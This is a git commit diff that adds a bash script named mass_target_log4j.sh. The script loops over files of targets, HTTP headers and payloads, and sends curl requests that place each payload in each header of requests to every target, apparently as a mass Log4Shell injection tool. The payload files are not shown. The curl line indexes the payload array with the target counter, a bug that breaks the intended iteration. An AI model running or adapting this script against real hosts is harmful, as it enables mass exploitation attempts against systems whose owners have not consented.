39002fdc62d411e8edfecceb6eb9b98e696f30d4
Eron Clarke <64993805+havoc3-3@users.noreply.github.com>
2021-12-16 12:51:03 -0600

    Add files via upload

---
+++ mass_target_log4j.sh
@@ -0,0 +1,18 @@
+#! /bin/bash
+
+# Ensure these .txt files are in the same dir or specify full path
+readarray -t target <target_list.txt
+readarray -t payload <payload_list.txt
+readarray -t headers <headers_2.txt
+
+for i in ${!target[@]}; do 
+    for j in ${!headers[@]}; do
+        for k in ${!payload[@]}; do
+            # Echo current value of Target/Header/Payload for each request sent; visual tracking purposes
+            echo Target - ${target[i]}  - Header - ${headers[j]} - Payload - ${payload[k]}
+            # Sending HTTP response to /dev/null, will blow up terminal if turned off
+            curl --insecure ${target[i]} -H "${headers[j]}: ${payload[i]}" > /dev/null 2>&1;
+            # sleep
+        done;
+    done;
+done
